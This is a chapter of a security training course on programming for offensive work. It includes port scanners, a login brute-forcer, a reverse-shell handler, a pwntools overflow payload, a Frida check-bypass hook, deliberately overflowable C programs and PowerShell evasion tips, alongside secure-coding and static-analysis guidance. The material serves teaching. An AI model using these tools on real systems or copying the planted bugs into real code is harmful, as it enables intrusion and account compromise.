---
title: "Programming for security: Python, C, Go"
area: "Programming"
order: 7
level: "intermediate"
summary: "Without knowing how to code, you can't write tools, exploits, or automation. Python as the 'lingua franca', C to understand what runs underneath, Go/Rust for modern tooling. Secure coding best practices."
prereq:
  - "Sections 01, 02"
tools:
  - "Python 3.11+, pip, venv"
  - "gcc, gdb, make"
  - "Go 1.22+"
  - "Visual Studio Code / Neovim"
---

# Programming for security

> **You can't do high-level offensive work without programming.** The tools you use are code. The bugs you hunt are code. The exploits you write are code. The malware you reverse engineer is code. Go learn.

## Which languages and why

| Language | What it's used for in security | Importance |
|---|---|---|
| **Python** | Tooling, scripting, exploit dev, automation, glue | ⭐⭐⭐⭐⭐ |
| **Bash** | OS scripting, post-exploitation, glue | ⭐⭐⭐⭐ |
| **C** | Understanding stack/heap, malware, kernel, shellcode | ⭐⭐⭐⭐ |
| **C++** | Reverse engineering Windows binaries, game engines | ⭐⭐⭐ |
| **JavaScript** | Web (XSS, prototype pollution), Node | ⭐⭐⭐⭐ |
| **PowerShell** | Windows post-exploitation | ⭐⭐⭐⭐ |
| **Go** | Modern implants, static offensive tools, cross-compilation | ⭐⭐⭐⭐ |
| **Rust** | Modern tooling, some new-generation malware | ⭐⭐⭐ |
| **C#** | .NET, Active Directory, Rubeus, Seatbelt, BloodHound | ⭐⭐⭐⭐ |
| **Assembly x86/x64 and ARM** | Reverse engineering, exploit dev, shellcode | ⭐⭐⭐⭐ |
| **SQL** | SQLi, blue team log queries | ⭐⭐⭐ |
| **YAML/JSON/Regex** | Config, parsing, querying | ⭐⭐⭐⭐ |

You don't need to be native-speaker level in all of them. **Python fluency + reading C + reading JS + bash is the minimum.**

## Python for security

### Basic setup

```bash
python3 -m venv .venv
source .venv/bin/activate    # Linux/macOS
# .venv\Scripts\activate     # Windows
pip install --upgrade pip
pip install requests beautifulsoup4 dnspython scapy pycryptodome impacket paramiko pwntools
```

A separate virtualenv per project. Pin versions in `requirements.txt`.

### Useful standard library modules

- `os`, `sys`, `subprocess` — OS interaction.
- `socket` — raw TCP/UDP.
- `ssl` — TLS.
- `urllib`, `http.server`.
- `struct` — binary pack/unpack.
- `re` — regex.
- `argparse` — CLI parsing.
- `json`, `csv`, `xml`, `html`.
- `pathlib` — modern paths.
- `concurrent.futures` — thread/process pools.
- `asyncio` — event-loop concurrency.
- `hashlib`, `hmac`, `secrets`.
- `logging`.

### Third-party libraries for offensive work

| Library | Use |
|---|---|
| **requests** / **httpx** | HTTP client |
| **aiohttp** / **httpx** | async HTTP |
| **BeautifulSoup**, **lxml** | HTML parsing |
| **scapy** | packet crafting/sniffing |
| **dnspython** | DNS |
| **paramiko** / **fabric** | SSH |
| **impacket** | SMB/AD/Kerberos (Microsoft net stack) |
| **bloodhound-python** | BloodHound collector |
| **pwntools** | exploit dev / CTF |
| **pycryptodome** / **cryptography** | crypto |
| **frida** | dynamic instrumentation |
| **angr** | symbolic execution |
| **capstone** / **keystone** / **unicorn** | disassemble/assemble/emulate |

### Example: minimal port scanner

```python
import socket, concurrent.futures, sys

def scan(host, port, timeout=1.0):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            return port
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None

def scan_host(host, ports):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
        for p in ex.map(lambda p: scan(host, p), ports):
            if p is not None:
                open_ports.append(p)
    return sorted(open_ports)

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"
    print(scan_host(host, range(1, 1025)))
```

Run it against **`scanme.nmap.org`** (the Nmap Project offers it for training). Never against anything else without permission.

### Example: basic HTTP fuzzer

```python
import requests, itertools, string

BASE = "https://example.com/login"
USER = "admin"
ALPHA = string.ascii_lowercase + string.digits

session = requests.Session()
session.headers["User-Agent"] = "fuzzer/0.1"

for pwd_len in range(3, 5):
    for combo in itertools.product(ALPHA, repeat=pwd_len):
        pwd = "".join(combo)
        r = session.post(BASE, data={"u": USER, "p": pwd}, allow_redirects=False)
        # discriminatore: status / response length / Set-Cookie presence
        if r.status_code == 302 and "session" in r.headers.get("set-cookie", ""):
            print("HIT:", pwd)
            break
```

To extend with threading/async, rate limiting, and reading from a wordlist (rockyou).

### Example: DNS enumeration

```python
import dns.resolver
import sys

def enum_subs(domain, wordlist):
    r = dns.resolver.Resolver()
    r.timeout = 1; r.lifetime = 2
    for w in wordlist:
        sub = f"{w}.{domain}"
        try:
            ans = r.resolve(sub, 'A')
            for a in ans:
                print(f"{sub:<40} {a}")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
            pass

if __name__ == "__main__":
    with open(sys.argv[2]) as f:
        words = [w.strip() for w in f if w.strip()]
    enum_subs(sys.argv[1], words)
```

### Example: reverse shell handler in Python

```python
# attacker
import socket, threading, sys

def handle(conn, addr):
    print(f"[+] conn from {addr}")
    try:
        while True:
            cmd = input("$ ").strip()
            if not cmd: continue
            if cmd == "exit": break
            conn.sendall((cmd + "\n").encode())
            data = b""
            conn.settimeout(2)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    data += chunk
            except socket.timeout:
                pass
            sys.stdout.write(data.decode(errors="replace"))
    finally:
        conn.close()

def main(port):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(1)
    print(f"[*] listening on {port}")
    while True:
        c, a = s.accept()
        threading.Thread(target=handle, args=(c, a), daemon=True).start()

main(int(sys.argv[1]) if len(sys.argv) > 1 else 4444)
```

### Pwntools (for CTF/exploit dev)

```python
from pwn import *

context.binary = "./vuln"
io = process("./vuln")            # locale
# io = remote("host", 1337)       # remoto
io.recvuntil(b"input: ")
payload = b"A" * 40 + p64(0xdeadbeefcafebabe)
io.sendline(payload)
io.interactive()
```

`pwntools` abstracts you away from binascii/struct, integrates `gdb.attach`, includes a ROP gadget finder, format-string helpers, etc. **Learn the manual way first**: understand `p64`, `p32`, endian layout, and how to compute the RIP offset.

### Python best practices

1. **Type hints** (`def f(x: int) -> str:`).
2. **Logging** instead of `print`.
3. **Modern paths** (`pathlib`).
4. **Always use venv**.
5. **Validate input** if you take user arguments in offensive tools (yes, that's the whole point).
6. **Never run `subprocess.run(cmd, shell=True)`** with unsanitized user input (command injection). Prefer `shell=False` plus a list.
7. **Never `eval`/`exec`** on uncontrolled input.
8. **Constant-time compare** for tokens / hashes (`hmac.compare_digest`).

## C — the language for understanding what's underneath

Knowing C gives you:
- The ability to read malware (most of it is C/C++).
- The ability to write shellcode/exploits.
- The ability to understand decompiled output from Ghidra/IDA.
- A precise grasp of pointers/memory/UB.

### Annotated example

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void weak_copy(char *dst, const char *src) {
    while (*src) *dst++ = *src++;  // copia senza limite — buffer overflow se dst troppo piccolo
    *dst = '\0';
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <input>\n", argv[0]);
        return 1;
    }
    char buf[16];
    weak_copy(buf, argv[1]);
    printf("Got: %s\n", buf);
    return 0;
}
```

Compile and break it:
```bash
gcc -fno-stack-protector -z execstack -no-pie -o weak weak.c
./weak "$(python3 -c 'print("A"*100)')"   # segfault!
```

### C bug patterns you'll hunt for

- **Buffer overflow**: `strcpy`, `strcat`, `sprintf`, `gets`. All banned in 2026. Use `strncpy_s`, `snprintf`, etc., and remember to null-terminate.
- **Off-by-one**: the classic `for (i=0; i<=n; i++) buf[i]=...`.
- **Format string**: `printf(user_input)` instead of `printf("%s", user_input)`. Allows arbitrary memory read/write (see section 14).
- **Integer overflow/underflow**: `malloc(n * sizeof(T))` where `n` is attacker-controlled → overflow → small allocation → heap overflow.
- **Use-after-free**: using a pointer after `free`.
- **Double free**.
- **Null deref**, **uninitialized memory**.
- **TOCTOU**: `access()` then `open()`.
- **Signal handler race conditions**.

### Compile/Debug flow

```bash
gcc -Wall -Wextra -Werror -O0 -g vuln.c -o vuln
gdb ./vuln
(gdb) run "AAAA"
(gdb) info registers
(gdb) x/40wx $rsp
(gdb) disas main
```

For training: the `pwndbg`, `gef`, `peda` extensions — they give gdb a modern UX.

## Go for modern tooling

Strengths:
- Compiles to a single static binary (no runtime dependencies).
- Cross-compilation is trivial.
- Goroutines for concurrency.
- Native HTTP/2/3, mature crypto/net standard library.
- Simple syntax.

Used in tools like **gobuster**, **ffuf**, **subfinder**, **nuclei**, **httpx**, **interactsh**, in modern C2 frameworks (**Sliver**, **Havoc-side**), and in a great deal of modern malware.

```go
// scanner.go
package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func scan(host string, port int, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	sem <- struct{}{}
	defer func() { <-sem }()

	addr := net.JoinHostPort(host, strconv.Itoa(port))
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()
	d := net.Dialer{}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err == nil {
		fmt.Println("open", port)
		conn.Close()
	}
}

func main() {
	host := os.Args[1]
	var wg sync.WaitGroup
	sem := make(chan struct{}, 200)
	for p := 1; p <= 1024; p++ {
		wg.Add(1)
		go scan(host, p, &wg, sem)
	}
	wg.Wait()
}
```

`go build scanner.go && ./scanner scanme.nmap.org`. Cross-compile: `GOOS=windows GOARCH=amd64 go build`.

## C# for AD and .NET tooling

Indispensable tools in AD pentesting (section 13) are written in C#:
- **Rubeus** — Kerberos (ASREPRoast, Kerberoasting, golden/silver tickets).
- **Seatbelt** — local host/AD enumeration.
- **SharpHound** — collector for BloodHound.
- **SharpUp / SharpView** — privesc / AD queries.

To modify or use them you need basic C# knowledge. **Visual Studio Community** is free, or use the `dotnet` CLI.

## JavaScript for the web

Knowing JS is mandatory for:
- Recognizing and writing XSS payloads.
- Reversing SPA Webpack bundles.
- Analyzing Node/Electron-based malware.
- Browser extension malware.
- Prototype pollution.
- DOM clobbering.

Know at least: ES6+, `Promise`/`async`, `fetch`, `URL`/`URLSearchParams`, `JSON.parse`, `eval` and why to avoid it, the differences between `globalThis`/`window`.

## PowerShell for Windows

For Windows post-exploitation, PowerShell is "the" language. However:
- Recent versions have **ScriptBlock Logging**, **Module Logging**, **AMSI**, **Constrained Language Mode**.
- Defender + EDR recognize well-known patterns (see `Invoke-Mimikatz`).

Key skills: `Invoke-RestMethod`, `Invoke-WebRequest`, `Get-ADUser`, `Get-Process`, `Get-WmiObject`/`Get-CimInstance`, `Set-MpPreference` (controls Defender if you're admin), pipeline objects.

Tip: PowerShell **5.1** has more telemetry than **2.0**, but `powershell.exe -version 2` is often unavailable on modern Windows 10/11 → don't count on the "downgrade attack" evasion the way you used to.

## Bash / Zsh — recap

Already covered in section 02. Adding:
- `eval` is evil: user input → RCE.
- Paranoid quoting: `"$var"`, `"$@"` (NOT `$@`).
- `set -euo pipefail` as the default.
- Shellcheck (`shellcheck script.sh`) for static analysis.

## Secure coding — the principle

Even if your job is offensive, knowing how to write secure code is crucial:

1. **Validate input at the boundary**: assume input is hostile.
2. **Parameterized queries** always (never `f"SELECT * WHERE id={id}"`).
3. **Output encoding**: HTML, URL, SQL, shell, log — the right encoding for the context.
4. **Authn ≠ Authz**. Keep them separate.
5. **Least privilege**: every service runs with minimum privileges.
6. **Defense in depth**: multiple independent layers.
7. **Fail safe / fail closed**: on error, deny access.
8. **Don't roll your own crypto**.
9. **Logging**, but no secrets in the logs.
10. **Patch management**, dependencies kept up to date (SBOM, Renovate, Dependabot, OSV-Scanner).
11. **Threat modeling** at the design stage (STRIDE).

### SAST/DAST/SCA
- **SAST** (Static Application Security Testing): code analysis without running it. Tools: SonarQube, Semgrep, CodeQL, Snyk Code, Checkov for IaC.
- **DAST** (Dynamic): tests the app while it's running (ZAP, Burp Suite Scanner).
- **SCA** (Software Composition Analysis): vulnerabilities in dependencies (Snyk Open Source, Dependabot, Trivy, Grype).
- **IAST**: hybrid (in-process agent).
- **Fuzzing**: random inputs to discover crashes (AFL++, libFuzzer, Honggfuzz, OSS-Fuzz).

## Exercises

### Exercise 7.1 — Mini-tool
Write a Python script that, given a list of URLs, performs GET requests with a 3s timeout and outputs CSV: `url, status, length, server_header, title`.

<details><summary>Solution</summary>

```python
import csv, sys, requests, re
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch(url):
    try:
        r = requests.get(url, timeout=3, allow_redirects=True, verify=False)
        m = re.search(r"<title>([^<]*)</title>", r.text, re.IGNORECASE)
        title = m.group(1).strip() if m else ""
        return (url, r.status_code, len(r.content), r.headers.get("server", ""), title)
    except Exception as e:
        return (url, "ERR", 0, "", str(e)[:80])

urls = [l.strip() for l in open(sys.argv[1]) if l.strip()]
w = csv.writer(sys.stdout)
w.writerow(["url","status","length","server","title"])
with ThreadPoolExecutor(max_workers=50) as ex:
    for fut in as_completed([ex.submit(fetch, u) for u in urls]):
        w.writerow(fut.result())
```

</details>

### Exercise 7.2 — Write an SSH brute-forcer client
With `paramiko`, given `host:port`, a user list, and a password list, attempt login. Output: successful tuples. Add:
- a per-attempt timeout,
- max concurrency (asyncio or thread pool),
- early exit on lockout (HTTP 429-style: after N failures stop for a cooldown).

**Lab use only**.

### Exercise 7.3 — Buffer overflow proof of concept
Compile and analyze:

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    char buf[64];
    strcpy(buf, argv[1]);
    return 0;
}
```

With `gcc -fno-stack-protector -no-pie -z execstack -o bof bof.c`.
- Find the exact offset that overwrites RIP (use `pwntools` `cyclic`).
- How many bytes? Which register contains the pattern after the crash in gdb?

<details><summary>Hint</summary>

```python
from pwn import *
p = cyclic(200)
io = process(["./bof", p])
io.wait()
core = io.corefile
print(cyclic_find(core.fault_addr & 0xffffffffffffffff))
```

The typical offset is 72 (64 buf + 8 saved RBP) but it can vary with compiler padding.

</details>

### Exercise 7.4 — Go HTTP fuzzer
Rewrite the previous Python fuzzer in Go. Use goroutines for parallelism.

### Exercise 7.5 — Frida function sniffing
On a binary with symbols, hook a function `int validate(char *input)`:

```js
// frida script
const validate = Module.findExportByName(null, "validate");
Interceptor.attach(validate, {
    onEnter(args) {
        console.log("input:", args[0].readUtf8String());
    },
    onLeave(retval) {
        console.log("ret:", retval);
        retval.replace(1);  // bypass: forza ritorno 1
    }
});
```

```bash
frida -l hook.js -f ./target
```

Try it on a crackme from [crackmes.one](https://crackmes.one).

### Exercise 7.6 — Semgrep
Install Semgrep. Run public rules on an open Python project (e.g., a small Flask app):

```bash
pip install semgrep
semgrep --config "p/python" .
semgrep --config "p/security-audit" .
```

What does it find? How many false positives? What's the difference between `--config p/python` and `--config p/owasp-top-ten`?

### Exercise 7.7 — Write a Semgrep rule
Write a rule that finds calls to `subprocess.run(..., shell=True)` whose arguments include `+` (concatenation).

```yaml
rules:
  - id: subprocess-shell-true-concat
    pattern: subprocess.run(..., shell=True)
    message: subprocess con shell=True
    severity: WARNING
    languages: [python]
```

## Key takeaways

1. **Python is the lingua franca** of security.
2. **C is what you need to understand the underlying layers.** Don't skip it.
3. **Go/Rust** are the future of statically compiled offensive tooling.
4. **JS + C#** for web and AD respectively.
5. **Pwntools** for CTF/exploit dev.
6. **SAST/DAST/SCA** are part of the modern DevSecOps process.
7. **Secure coding** makes you a better offensive operator (you know where to look).

You've got the language building blocks. Now the hunt begins: OSINT, scanning, web pwn.
